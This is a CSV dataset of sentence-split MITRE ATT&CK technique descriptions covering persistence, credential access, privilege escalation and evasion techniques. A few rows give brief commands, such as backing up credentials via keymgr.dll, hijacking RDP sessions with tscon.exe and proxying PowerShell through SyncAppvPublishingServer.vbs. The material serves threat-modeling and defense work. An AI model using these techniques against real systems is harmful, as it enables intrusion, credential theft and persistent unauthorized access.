14457,T1555,T1555.004,Windows Credential Manager,"Windows APIs, such as CredEnumerateA, may also be absued to list credentials managed by the Credential Manager."
14458,T1555,T1555.004,Windows Credential Manager,Adversaries may also obtain credentials from credential backups.
14459,T1555,T1555.004,Windows Credential Manager,Credential backups and restorations may be performed by running rundll32.exe keymgr.dll KRShowKeyMgr then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.
14460,T1555,T1555.004,Windows Credential Manager,Password recovery tools may also obtain plain text passwords from the Credential Manager.

14472,T1194,T1194,Spearphishing via Service,It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels.
14473,T1194,T1194,Spearphishing via Service,"In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services."
14474,T1194,T1194,Spearphishing via Service,These services are more likely to have a less-strict security policy than an enterprise.
14475,T1194,T1194,Spearphishing via Service,"As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way."
14476,T1194,T1194,Spearphishing via Service,Adversaries will create fake social media accounts and message employees for potential job opportunities.
14477,T1194,T1194,Spearphishing via Service,"Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment."
14478,T1194,T1194,Spearphishing via Service,The adversary can then send malicious links or attachments through these services.

14899,T1189,T1189,Drive-by Compromise,Adversaries may gain access to a system through a user visiting a website over the normal course of browsing.
14900,T1189,T1189,Drive-by Compromise,"With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token,."
14901,T1189,T1189,Drive-by Compromise,"Multiple ways of delivering exploit code to a browser exist , Drive-by Target,, including:
* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting
* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary
* Malicious ads are paid for and served through legitimate ad providers , Malvertising,
* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client ."
14902,T1189,T1189,Drive-by Compromise,"Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest."
14903,T1189,T1189,Drive-by Compromise,This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack.
14904,T1189,T1189,Drive-by Compromise,There are several known examples of this occurring.
14905,T1189,T1189,Drive-by Compromise,"Typical drive-by compromise process:
1."
14906,T1189,T1189,Drive-by Compromise,A user visits a website that is used to host the adversary controlled content.
14907,T1189,T1189,Drive-by Compromise,"Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version."
14908,T1189,T1189,Drive-by Compromise,* The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
14909,T1189,T1189,Drive-by Compromise,"Upon finding a vulnerable version, exploit code is delivered to the browser."
14910,T1189,T1189,Drive-by Compromise,"If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place."
14911,T1189,T1189,Drive-by Compromise,* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.
14912,T1189,T1189,Drive-by Compromise,"Unlike Exploit Public-Facing Application,, the focus of this technique is to exploit software on a client endpoint upon visiting a website."
14913,T1189,T1189,Drive-by Compromise,This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.
14914,T1189,T1189,Drive-by Compromise,"Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Token,s, like OAuth tokens, to gain access to protected applications and information."
14915,T1189,T1189,Drive-by Compromise,These malicious applications have been delivered through popups on legitimate websites.

14957,T1498,T1498,Network Denial of Service,Adversaries may perform Network Denial of Service  attacks to degrade or block the availability of targeted resources to users.
14958,T1498,T1498,Network Denial of Service,Network DoS can be performed by exhausting the network bandwidth services rely on.
14959,T1498,T1498,Network Denial of Service,"Example resources include specific websites, email services, DNS, and web-based applications."
14960,T1498,T1498,Network Denial of Service,"Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion."
14961,T1498,T1498,Network Denial of Service,A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on.
14962,T1498,T1498,Network Denial of Service,"For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet."
14963,T1498,T1498,Network Denial of Service,"This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS ."

14969,T1651,T1651,Cloud Administration Command,Adversaries may abuse cloud management services to execute commands within virtual machines.
14970,T1651,T1651,Cloud Administration Command,"Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents."
14971,T1651,T1651,Cloud Administration Command,"If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines."

14974,T1546,T1546.016,Installer Packages,Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content.
14975,T1546,T1546.016,Installer Packages,Installer packages are OS specific and contain the resources an operating system needs to install applications on a system.
14976,T1546,T1546.016,Installer Packages,Installer packages can include scripts that run prior to installation as well as after installation is complete.
14977,T1546,T1546.016,Installer Packages,Installer scripts may inherit elevated permissions when executed.
14978,T1546,T1546.016,Installer Packages,"Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation."
14979,T1546,T1546.016,Installer Packages,"Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content."
14980,T1546,T1546.016,Installer Packages,"When a user installs the application, they may be required to grant administrative permissions to allow the installation."
14981,T1546,T1546.016,Installer Packages,"At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions."
14982,T1546,T1546.016,Installer Packages,Adversaries can use these scripts to execute a malicious executable or install other malicious components  with the elevated permissions.
14983,T1546,T1546.016,Installer Packages,"Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts."
14984,T1546,T1546.016,Installer Packages,"These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed."
14985,T1546,T1546.016,Installer Packages,"For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications."
14986,T1546,T1546.016,Installer Packages,These installation routines may also include instructions to perform additional actions that may be abused by adversaries.
14987,T1546,T1546.016,Installer Packages,"During AppleJeus,'s installation process, it uses `postinstall` scripts to extract a hidden plist from the application's `/Resources` folder and execute the `plist` file as a Launch Daemon, with elevated permissions."
14988,T1595,T1595.001,Scanning IP Blocks,Adversaries may scan victim IP blocks to gather information that can be used during targeting.
14989,T1595,T1595.001,Scanning IP Blocks,"Adversaries may scan IP blocks in order to Gather Victim Network Information,, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses."
14990,T1595,T1595.001,Scanning IP Blocks,Scans may range from simple pings  to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.
14991,T1595,T1595.001,Scanning IP Blocks,"TeamTNT, has scanned specific lists of target IP addresses."
14992,T1158,T1158,Hidden Files and Directories,"To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file."
14993,T1158,T1158,Hidden Files and Directories,These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line.
14994,T1158,T1158,Hidden Files and Directories,Users must explicitly ask to show the hidden files either via a series of Graphical User Interface  prompts or with command line switches .
14995,T1158,T1158,Hidden Files and Directories,Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.
14996,T1158,T1158,Hidden Files and Directories,"### Windows
Users can mark specific files as hidden by using the attrib.exe binary."
14997,T1158,T1158,Hidden Files and Directories,Simply do attrib +h filename to mark a file or folder as hidden.
14998,T1158,T1158,Hidden Files and Directories,"Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only."
14999,T1158,T1158,Hidden Files and Directories,"Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”."
15000,T1158,T1158,Hidden Files and Directories,"### Linux/Mac
Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   ."
15001,T1158,T1158,Hidden Files and Directories,"Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”."
15002,T1158,T1158,Hidden Files and Directories,Users must specifically change settings to have these files viewable.
15003,T1158,T1158,Hidden Files and Directories,"For command line usages, there is typically a flag to see all files ."
15004,T1158,T1158,Hidden Files and Directories,"To view these files in the Finder Application, the following command must be executed: defaults write com.apple.finder AppleShowAllFiles YES, and then relaunch the Finder Application."
15005,T1158,T1158,Hidden Files and Directories,"### Mac
Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app ."
15006,T1158,T1158,Hidden Files and Directories,Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace.
15007,T1158,T1158,Hidden Files and Directories,"For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys."
15008,T1221,T1221,Template Injection,Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts.
15009,T1221,T1221,Template Injection,"For example, Microsoft’s Office Open XML  specification defines an XML-based format for Office documents  to replace older binary formats ."
15010,T1221,T1221,Template Injection,"OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered."
15011,T1221,T1221,Template Injection,Properties within parts may reference shared public resources accessed via online URLs.
15012,T1221,T1221,Template Injection,"For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded."
15013,T1221,T1221,Template Injection,Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents.
15014,T1221,T1221,Template Injection,Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.
15015,T1221,T1221,Template Injection,"These documents can be delivered via other techniques such as Phishing, and/or Taint Shared Content, and may evade static detections since no typical indicators  are present until after the malicious payload is fetched."
15016,T1221,T1221,Template Injection,Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.
15017,T1221,T1221,Template Injection,Adversaries may also modify the *\template control word within an .rtf file to similarly conceal then download malicious code.
15018,T1221,T1221,Template Injection,This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened.
15019,T1221,T1221,Template Injection,"However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload."
15020,T1221,T1221,Template Injection,"This technique may also enable Forced Authentication, by injecting a SMB/HTTPS  URL and triggering an authentication attempt."
15021,T1221,T1221,Template Injection,"Chaes, changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload."
15022,T1221,T1221,Template Injection,"WarzoneRAT, has been install via template injection through a malicious DLL embedded within a template RTF in a Word document."

15033,T1221,T1221,Template Injection,"Dragonfly 2.0, has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication,."
15034,T1037,T1037.004,RC Scripts,Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup.
15035,T1037,T1037.004,RC Scripts,These files allow system administrators to map and start custom services at startup for different run levels.
15036,T1037,T1037.004,RC Scripts,RC scripts require root privileges to modify.
15037,T1037,T1037.004,RC Scripts,"Adversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution."
15038,T1037,T1037.004,RC Scripts,"Upon reboot, the system executes the script's contents as root, resulting in persistence."
15039,T1037,T1037.004,RC Scripts,"Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems."
15040,T1037,T1037.004,RC Scripts,Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts.
15041,T1037,T1037.004,RC Scripts,"This is now a deprecated mechanism in macOS in favor of Launchd,."
15042,T1037,T1037.004,RC Scripts,This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.
15043,T1037,T1037.004,RC Scripts,"To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions."
15044,T1037,T1037.004,RC Scripts,"HiddenWasp, installs reboot persistence by adding itself to /etc/rc.local."

15049,T1134,T1134,Access Token Manipulation,Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.
15050,T1134,T1134,Access Token Manipulation,Windows uses access tokens to determine the ownership of a running process.
15051,T1134,T1134,Access Token Manipulation,A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.
15052,T1134,T1134,Access Token Manipulation,"When this occurs, the process also takes on the security context associated with the new token."
15053,T1134,T1134,Access Token Manipulation,An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.
15054,T1134,T1134,Access Token Manipulation,"These token can then be applied to an existing process  Token Impersonation/Theft, or used to spawn a new process  Create Process with Token,."
15055,T1134,T1134,Access Token Manipulation,An adversary must already be in a privileged user context  administrator to steal a token.
15056,T1134,T1134,Access Token Manipulation,"However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level."
15057,T1134,T1134,Access Token Manipulation,An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.
15058,T1134,T1134,Access Token Manipulation,"Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account."
15059,T1134,T1134,Access Token Manipulation,"There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens."
15060,T1134,T1134,Access Token Manipulation,"HermeticWiper, can use `AdjustTokenPrivileges` to grant itself privileges for debugging with `SeDebugPrivilege`, creating backups with `SeBackupPrivilege`, loading drivers with `SeLoadDriverPrivilege`, and shutting down a local system with `SeShutdownPrivilege`."

15080,T1209,T1209,Time Providers,"Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider."
15081,T1111,T1111,Multi-Factor Authentication Interception,"Adversaries may target multi-factor authentication  mechanisms, , smart cards, token generators, etc."
15082,T1111,T1111,Multi-Factor Authentication Interception,"to gain access to credentials that can be used to access systems, services, and network resources."
15083,T1111,T1111,Multi-Factor Authentication Interception,"Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms."
15084,T1111,T1111,Multi-Factor Authentication Interception,"If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use."
15085,T1111,T1111,Multi-Factor Authentication Interception,"With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token."
15086,T1111,T1111,Multi-Factor Authentication Interception,"Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID."
15087,T1111,T1111,Multi-Factor Authentication Interception,Capturing token input  may provide temporary access  replay the one-time passcode until the next value rollover as well as possibly enabling adversaries to reliably predict future authentication values .
15088,T1111,T1111,Multi-Factor Authentication Interception,Other methods of MFA may be intercepted and used by an adversary to authenticate.
15089,T1111,T1111,Multi-Factor Authentication Interception,It is common for one-time codes to be sent via out-of-band communications .
15090,T1111,T1111,Multi-Factor Authentication Interception,"If the device and/or service is not secured, then it may be vulnerable to interception."
15091,T1111,T1111,Multi-Factor Authentication Interception,"Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones."

15648,T1564,T1564.005,Hidden File System,"In doing so, adversaries can hide the presence of malicious components and file input/output from security tools."
15649,T1564,T1564.005,Hidden File System,"Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways."
15650,T1564,T1564.005,Hidden File System,One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.
15651,T1564,T1564.005,Hidden File System,Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.
15652,T1564,T1564.005,Hidden File System,Adversaries may also fragment files across the existing file system structure in non-standard ways.

15660,T1543,T1543.002,Systemd Service,Systemd is a system and service manager commonly used for managing background daemon processes  and other system resources.
15661,T1543,T1543.002,Systemd Service,"Systemd is the default initialization  system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible."
15662,T1543,T1543.002,Systemd Service,Systemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process.
15663,T1543,T1543.002,Systemd Service,"By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories ."
15664,T1543,T1543.002,Systemd Service,User level unit files are stored in the `/systemd/user` directories of the user owned directories .
15665,T1543,T1543.002,Systemd Service,"Inside the `.service` unit files, the following directives are used to execute commands:  
* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start."
15666,T1543,T1543.002,Systemd Service,* `ExecReload` directive executes when a service restarts.
15667,T1543,T1543.002,Systemd Service,"* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped."
15668,T1543,T1543.002,Systemd Service,"Adversaries have created new service files, altered the commands a `.service` file’s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation."
15669,T1543,T1543.002,Systemd Service,"Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem."
15670,T1543,T1543.002,Systemd Service,"The .service file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions."
15671,T1543,T1543.002,Systemd Service,"Depending on the Linux distribution and when executing with root permissions, RotaJakiro, may install persistence using a `.service` file under the `/lib/systemd/system/` folder."
15672,T1543,T1543.002,Systemd Service,"SysUpdate, can copy a script to the user owned `/usr/lib/systemd/system/` directory with a symlink mapped to a `root` owned directory, `/etc/ystem/system`, in the unit configuration file's `ExecStart` directive to establish persistence and elevate privileges."

15677,T1563,T1563.002,RDP Hijacking,Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session.
15678,T1563,T1563.002,RDP Hijacking,"Typically, a user is notified when someone else is trying to steal their session."
15679,T1563,T1563.002,RDP Hijacking,"With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe session number to be stolen,`, an adversary can hijack a session without the need for credentials or prompts to the user."
15680,T1563,T1563.002,RDP Hijacking,"All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools."
15681,T1563,T1563.002,RDP Hijacking,"WannaCry, enumerates current remote desktop sessions and tries to execute the malware on each session."

15683,T1136,T1136,Create Account,Adversaries may create an account to maintain access to victim systems.
15684,T1136,T1136,Create Account,"With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
15685,T1136,T1136,Create Account,Accounts may be created on the local system or within a domain or cloud tenant.
15686,T1136,T1136,Create Account,"In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection."
15687,T1136,T1136,Create Account,"Indrik Spider, used wmic.exe to add a new user to the system."
15688,T1136,T1136,Create Account,"Scattered Spider, creates new user identities within the compromised organization."

16490,T1216,T1216.002,SyncAppvPublishingServer,"Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious PowerShell, commands."
16491,T1216,T1216.002,SyncAppvPublishingServer,SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications .
16492,T1216,T1216.002,SyncAppvPublishingServer,"For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally."
16493,T1216,T1216.002,SyncAppvPublishingServer,"The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`."
16494,T1216,T1216.002,SyncAppvPublishingServer,"Adversaries may abuse SyncAppvPublishingServer.vbs to bypass PowerShell, execution restrictions and evade defensive counter measures by ""living off the land."""
16495,T1216,T1216.002,SyncAppvPublishingServer,Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.
16496,T1216,T1216.002,SyncAppvPublishingServer,"For example,  PowerShell, commands may be invoked using:
`SyncAppvPublishingServer.vbs ""n; {PowerShell}""`"
16497,T1098,T1098.002,Additional Email Delegate Permissions,Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.
16498,T1098,T1098.002,Additional Email Delegate Permissions,"For example, the Add-MailboxPermission PowerShell, cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox."
16499,T1098,T1098.002,Additional Email Delegate Permissions,"In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings."
16500,T1098,T1098.002,Additional Email Delegate Permissions,Adversaries may also assign mailbox folder permissions through individual folder permissions or roles.
16501,T1098,T1098.002,Additional Email Delegate Permissions,"In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store , Inbox, or other mailbox folders."
16502,T1098,T1098.002,Additional Email Delegate Permissions,"By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders."
16503,T1098,T1098.002,Additional Email Delegate Permissions,"This may be used in persistent threat incidents as well as BEC  incidents where an adversary can add Additional Cloud Roles, to the accounts they wish to compromise."
16504,T1098,T1098.002,Additional Email Delegate Permissions,This may further enable use of additional techniques for gaining access to systems.
16505,T1098,T1098.002,Additional Email Delegate Permissions,"For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules , so the messages evade spam/phishing detection mechanisms."
16506,T1098,T1098.002,Additional Email Delegate Permissions,"APT28, has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account."
16507,T1098,T1098.002,Additional Email Delegate Permissions,"APT29, has used a compromised global administrator account in Azure AD to backdoor a service principal with `ApplicationImpersonation` rights to start collecting emails from targeted mailboxes; APT29, has also used compromised accounts holding `ApplicationImpersonation` rights in Exchange to collect emails."
16508,T1098,T1098.002,Additional Email Delegate Permissions,"UNC2452, added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes."
16509,T1098,T1098.002,Additional Email Delegate Permissions,It also added additional permissions  to compromised Application or Service Principals.
16510,T1098,T1098.002,Additional Email Delegate Permissions,"APT29, added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes."
16511,T1588,T1588.003,Code Signing Certificates,Adversaries may buy and/or steal code signing certificates that can be used during targeting.
16512,T1588,T1588.003,Code Signing Certificates,"Prior to Code Signing,, adversaries may purchase or steal code signing certificates for use in operations."
16513,T1588,T1588.003,Code Signing Certificates,The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity.
16514,T1588,T1588.003,Code Signing Certificates,Adversaries may also steal code signing materials directly from a compromised third-party.
16515,T1588,T1588.003,Code Signing Certificates,"MegaCortex, has used code signing certificates issued to fake companies to bypass security controls."
16516,T1588,T1588.003,Code Signing Certificates,"Wizard Spider, has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads."

16521,T1588,T1588.003,Code Signing Certificates,"Lazarus Group, has used code signing certificates issued by Sectigo RSA for some of its malware and tools."
16522,T1126,T1126,Network Share Connection Removal,"Windows shared drive and Windows Admin Shares, connections can be removed when no longer needed."
16523,T1648,T1648,Serverless Execution,"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments."
16524,T1648,T1648,Serverless Execution,"Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers."
16525,T1648,T1648,Serverless Execution,Adversaries may abuse these resources in various ways as a means of executing arbitrary commands.
16526,T1648,T1648,Serverless Execution,"For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware  Resource Hijacking,."
16527,T1648,T1648,Serverless Execution,Adversaries may also create functions that enable further compromise of the cloud environment.
16528,T1648,T1648,Serverless Execution,"For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add Additional Cloud Roles, to a serverless cloud function, which may then be able to perform actions the original user cannot."
16529,T1648,T1648,Serverless Execution,"Serverless functions can also be invoked in response to cloud events  Event Triggered Execution,, potentially enabling persistent execution over time."
16530,T1648,T1648,Serverless Execution,"For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials, to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created."
16531,T1648,T1648,Serverless Execution,"Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint."
16532,T1548,T1548.006,TCC Manipulation,"Adversaries can manipulate or abuse the Transparency, Consent, & Control  service or database to execute malicious applications with elevated permissions."
16533,T1548,T1548.006,TCC Manipulation,"TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access ."
16534,T1548,T1548.006,TCC Manipulation,"When an application requests to access data or a service protected by TCC, the TCC daemon  checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` , for existing permissions."
16535,T1548,T1548.006,TCC Manipulation,"If permissions do not exist, then the user is prompted to grant permission."
16536,T1548,T1548.006,TCC Manipulation,"Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset."
16537,T1548,T1548.006,TCC Manipulation,"For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again."
16538,T1548,T1548.006,TCC Manipulation,Adversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content.
16539,T1548,T1548.006,TCC Manipulation,"This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions."
16540,T1548,T1548.006,TCC Manipulation,"For example, adversaries can use Finder, which has FDA permissions by default, to execute malicious AppleScript, while preventing a user prompt."
16541,T1548,T1548.006,TCC Manipulation,"For a system without System Integrity Protection  enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and Launchctl,."
16542,T1548,T1548.006,TCC Manipulation,Adversaries may also opt to instead inject code  into targeted applications with the desired TCC permissions.
16543,T1084,T1084,Windows Management Instrumentation Event Subscription,"Windows Management Instrumentation  can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs."
16544,T1084,T1084,Windows Management Instrumentation Event Subscription,Adversaries may attempt to evade detection of this technique by compiling WMI scripts into Windows Management Object  files .
16545,T1084,T1084,Windows Management Instrumentation Event Subscription,Examples of events that may be subscribed to are the wall clock time or the computer's uptime.
16546,T1084,T1084,Windows Management Instrumentation Event Subscription,Several threat groups have reportedly used this technique to maintain persistence.
16547,T1160,T1160,Launch Daemon,"Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization."
16548,T1160,T1160,Launch Daemon,This process loads the parameters for each launch-on-demand system-level daemon from the property list  files found in /System/Library/LaunchDaemons and /Library/LaunchDaemons .
16549,T1160,T1160,Launch Daemon,These LaunchDaemons have property list files which point to the executables that will be launched .
16550,T1160,T1160,Launch Daemon,Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories .
16551,T1160,T1160,Launch Daemon,The daemon name may be disguised by using a name from a related operating system or benign software  .
16552,T1160,T1160,Launch Daemon,"Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root."
16553,T1160,T1160,Launch Daemon,"The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement."
16554,T1160,T1160,Launch Daemon,"So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation."
16555,T1055,T1055.008,Ptrace System Calls,Adversaries may inject malicious code into processes via ptrace  system calls in order to evade process-based defenses as well as possibly elevate privileges.
16556,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.
16557,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection involves attaching to and modifying a running process.
16558,T1055,T1055.008,Ptrace System Calls,"The ptrace system call enables a debugging process to observe and control another process , including changing memory and register values."
16559,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection is commonly performed by writing arbitrary code into a running process  then invoking that memory with PTRACE_SETREGS to set the register containing the next instruction to execute.
16560,T1055,T1055.008,Ptrace System Calls,"Ptrace system call injection can also be done with PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes’ memory ."
16561,T1055,T1055.008,Ptrace System Calls,Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.
16562,T1055,T1055.008,Ptrace System Calls,Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.
16563,T1055,T1055.008,Ptrace System Calls,"PACEMAKER, can use PTRACE to attach to a targeted process to read process memory."
16564,T1653,T1653,Power Settings,"Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines."
16565,T1653,T1653,Power Settings,"When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity."
16566,T1653,T1653,Power Settings,"Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity."
16567,T1653,T1653,Power Settings,"For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down."
16568,T1653,T1653,Power Settings,Adversaries may also extend system lock screen timeout settings.
16569,T1653,T1653,Power Settings,"Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active."
16570,T1653,T1653,Power Settings,"Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot."
16571,T1027,T1027.007,Dynamic API Resolution,Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis.
16572,T1027,T1027.007,Dynamic API Resolution,"Malware commonly uses various Native API, functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts."
16573,T1027,T1027.007,Dynamic API Resolution,API functions called by malware may leave static artifacts such as strings in payload files.
16574,T1027,T1027.007,Dynamic API Resolution,Defensive analysts may also uncover which functions a binary file may execute via an import address table  or other structures that help dynamically link calling code to the shared modules that provide functions.
16575,T1027,T1027.007,Dynamic API Resolution,"To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities."
